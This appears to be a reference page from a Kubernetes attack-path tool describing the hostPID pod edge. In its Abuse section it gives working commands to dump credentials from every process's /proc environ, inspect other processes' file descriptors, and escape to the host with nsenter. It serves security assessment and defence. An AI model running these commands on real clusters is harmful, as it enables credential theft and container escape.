# CH_podHostPID

## Edge Schema

- **Source:** [CH_Pod](../NodeDescriptions/CH_Pod.md)
- **Target:** [CH_Node](../NodeDescriptions/CH_Node.md)

## General Information

The Pod runs with `hostPID: true`, sharing the Node's PID namespace and enabling inspection or signalling of all host processes from within the container.

## Abuse

With access to the host PID namespace, all processes running on the node — including those in other pods — are visible. The primary attack path is harvesting credentials from `/proc`: environment variables often contain tokens, passwords, and API keys, and open file descriptors can expose files held open by other processes. `nsenter` to escape to the host is also possible but requires the container to run as root or hold `SYS_PTRACE`; hostPID alone does not guarantee it.

```bash
# Enumerate all host and pod processes
ps aux

# Dump environment variables from all visible processes
for e in $(ls /proc/*/environ 2>/dev/null); do
  echo "=== $e ==="; xargs -0 -L1 -a "$e" 2>/dev/null
done

# Inspect open file descriptors of a target process
ls -al /proc/<pid>/fd

# Escape to host (requires root or SYS_PTRACE in the container)
nsenter -t 1 -m -u -i -n -p -- bash
```

## References

- [BishopFox badPods - hostPID](https://github.com/BishopFox/badPods/tree/main/manifests/hostpid)
- [Kubernetes hostPID](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [HackTricks - hostPID Escape](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/escaping-from-kubernetes/kubernetes-node-local-privilege-escalation#hostpid)
- [OWASP K01 - Insecure Workload Configurations](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K01-Insecure-Workload-Configurations.html)
- [Threat Matrix - Privileged Container](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Privileged%20container/)
